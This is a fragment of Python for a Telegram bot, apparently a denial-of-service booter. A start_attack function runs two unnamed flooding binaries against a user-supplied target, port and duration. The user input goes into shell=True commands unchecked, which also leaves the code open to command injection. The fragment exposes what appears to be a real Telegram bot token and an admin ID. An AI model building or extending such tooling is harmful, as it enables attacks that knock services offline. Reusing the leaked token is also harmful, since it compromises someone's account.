...
config = load_config()
bot = telebot.TeleBot(config['7124159999:AAEJ92t6POU88C8BYCOnihH-PUQfiesM5eA'])
ADMIN_IDS = set(config['5184635355'])
...
def start_attack(user_id, target, port, duration):
    ...
    try:
        ongoing_attacks[attack_id] = subprocess.Popen(f"./{bgmi_file} {target} {port} {duration} 3600", shell=True)
        time.sleep(5)
        subprocess.run(f"./{sahil_file} {target} {port} {duration} 3600", shell=True)
